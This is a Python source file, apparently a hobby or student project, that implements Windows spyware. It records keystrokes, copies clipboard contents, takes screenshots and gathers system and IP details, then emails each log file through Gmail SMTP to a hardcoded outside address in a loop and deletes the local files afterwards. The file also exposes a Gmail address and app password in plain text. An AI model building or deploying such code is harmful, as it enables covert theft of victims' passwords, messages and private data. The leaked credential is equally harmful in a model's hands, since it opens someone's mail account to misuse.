# <------------To add an email functionality, we will be using the email module.----------------->

# -------------This module is used to create a multipart message. It allows you to compose messages with different content parts, such as text and attachments.
from email.mime.multipart import MIMEMultipart

# ----------------This module provides support for creating MIME objects of type 'text/plain' for including text content in the email.
from email.mime.text import MIMEText

# ----------------------This module helps in handling the base MIME type for attaching files to the email.
from email.mime.base import MIMEBase

# -----------------------This is the base module that contains functionality for constructing email messages.
from email import encoders

# -------------------- This module provides an SMTP client session object used to send mail to any internet machine with an SMTP or ESMTP listener daemon.
import smtplib


# <---------------To gather computer information, we will use socket and platform modules.----------->
import socket
import platform

# <--------To get the clipboard information, we will be using the win32clipboard module, which is a submodule of pywin32------------->
import win32clipboard

# <---------pynput has multiple functions including on_press, write_file, and on_release---------->
from pynput.keyboard import Key, Listener

# <---------------Taking Time With this module--------------------------------------->
import time

# <--------------- for interacting with the operating system--------------------------->
import os

from requests import get


# <---------------To take a screenshot, we will use the ImageGrab from the Pillow Module------------>
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# <---------------------------------------------Information Variables ------------------------------->

keys_information = "key_log.text"
clipboard_information = "clipboard.txt"
system_information = "systeminfo.txt"
screenshot_information = "screenshot.png"
# <--------------------------------------------For Infinte Loop variables----------------------------->
time_iteration = 15
number_of_iterations_end = 10

# <---------------------------------------For Sending Mail Variables---------------------------------->
email_address = "funwithiot.ignitia2k23@gmail.com"
password = "ijot atnp wgbv nrpr"
toaddr = "technnizworld502@gmail.com"

# <---------------------------------------File Paths Variable------------------------------------------>
file_path ="C:\\Users\\Sundram\\OneDrive\\Desktop\\New folder (3)"
extend = "\\"
file_merge = file_path + extend


# <-------------------------------------------Sending Email--------------------------------------------->

def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    # Create the message container
    msg = MIMEMultipart()
    msg["From"] = fromaddr
    msg["To"] = toaddr
    msg["Subject"] = "Log file"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, "plain"))

    # Attach the file
    attachment_file = open(attachment, "rb")
    p = MIMEBase("application", "octet-stream")
    p.set_payload(attachment_file.read())
    encoders.encode_base64(p)
    p.add_header("Content-Disposition", f"attachment; filename={filename}")
    msg.attach(p)

    # Connect to SMTP server and send email
    try:
        s = smtplib.SMTP("smtp.gmail.com", 587)
        s.starttls()
        s.login(fromaddr, password)
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Email could not be sent. Error: {str(e)}")




# <-------------------------------------------Taking System info ----------------------------->

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address : " + public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System : " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine : " + platform.machine() + "\n")
        f.write("Hostname : " + hostname + "\n")
        f.write("Private IP Address : " + IPAddr + "\n")

computer_information()



# <--------------------------------------------------Taking clipboard information-------------------------------->

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data : \n" + pasted_data)

        except:
            f.write("Clipboard Could be not copied")
copy_clipboard()


# <---------------------------------------------------Taking screenshot ------------------------------------------->

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()


# <--------------------------------Loops-------------------------------------------------------->
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration
while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []


    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()


        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()



    if currentTime > stoppingTime:
        with open(file_path + extend + screenshot_information, "w") as f:
            f.write(" ")
        screenshot()
        send_email(screenshot_information,file_path + extend + screenshot_information,toaddr)
        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

    send_email(keys_information,file_path + extend + keys_information,toaddr)
    send_email(clipboard_information,file_path + extend + clipboard_information,toaddr)
    send_email(system_information,file_path + extend + system_information,toaddr)
    

    time.sleep(120)

    
delete_files = [system_information, clipboard_information, keys_information, screenshot_information]
for file in delete_files:
    os.remove(file_merge + file)
    
    